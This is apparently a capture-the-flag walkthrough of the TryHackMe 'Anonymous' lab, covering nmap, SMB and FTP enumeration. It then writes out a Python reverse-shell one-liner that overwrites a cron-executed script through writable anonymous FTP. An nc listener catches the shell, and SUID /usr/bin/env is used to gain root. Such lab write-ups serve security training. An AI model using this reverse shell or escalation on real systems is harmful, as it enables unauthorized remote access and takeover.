# Anonymous

[Link to room](https://tryhackme.com/room/anonymous)

echo machine-ip anonymous.thm >> /etc/hosts

### Enumeration

```
# Nmap 7.80 scan initiated Sun Jun 21 05:11:05 2020 as: nmap -T4 -sC -sV -p- -oN nmap.txt anonymous.thm
Nmap scan report for anonymous.thm (10.10.246.82)
Host is up (0.20s latency).

PORT    STATE  SERVICE     VERSION
21/tcp  open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.10.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
80/tcp  closed http
139/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
443/tcp closed https
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-06-21T09:11:21+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-21T09:11:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 21 05:11:26 2020 -- 1 IP address (1 host up) scanned in 20.92 seconds

```

1. Enumerate the machine.  How many ports are open?

> check nmap scans

2. What service is running on port 21?

> port 21 is default for ftp

3. What service is running on ports 139 and 445?

> defalut ports for smb

4. There's a share on the user's computer.  What's it called?

```bash
smbclient -L \\\\anonymous.thm
```

```
Enter WORKGROUP\root's password: 
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        ????            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
#### FTP
```
root@strange:ftp anonymous.thm 
Connected to anonymous.thm.
220 NamelessOne's FTP Server!
Name (anonymous.thm:root): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         1505 Jun 21 09:15 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
ftp> binary
200 Switching to Binary mode.
ftp> prompt OFF
Interactive mode off.
ftp> mget *
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (100.1766 kB/s)
local: removed_files.log remote: removed_files.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (1505 bytes).
226 Transfer complete.
1505 bytes received in 0.00 secs (23.1497 MB/s)
local: to_do.txt remote: to_do.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (208.1701 kB/s)
ftp> 
```

### Exploitation

We will change the clean.sh to get a reverse shell

```python
Python reverse shell:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your-ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

After changing that our clean.sh will be like

```bash
root@strange:cat clean.sh 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your-ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Put the script in ftp server
```
ftp anonymous.thm 
Connected to anonymous.thm.
220 NamelessOne's FTP Server!
Name (anonymous.thm:root): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd scripts
250 Directory successfully changed.
ftp> put clean.sh 
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
227 bytes sent in 0.00 secs (4.8108 MB/s)
ftp> 
```

run this command to get the reverse shell `nc -lvnp <port_you_typed_in_the_clean.sh_file>`
After that we will just wait for our clean.sh to be execute by cron-job. It may take some time to pop-up

```
nc -lnvp 1234
listening on [any] 1234 ...
connect to [00.00.00.00] from (UNKNOWN) [10.10.246.82] 57844
/bin/sh: 0: can't access tty; job control turned off
$ 
```

5. user.txt

```
$ cat user.txt
```

> 90d6f9925858??????????????????

6. root.txt

```bash
find / -perm /4000 2>/dev/null
```

```

/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
```

We will `/usr/bin/env` to escalate privilege

```
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
# pwd
/home/namelessone
# cd /root
# ls
root.txt
# cat root.txt
4d930091c31a622a??????????????
# 
```
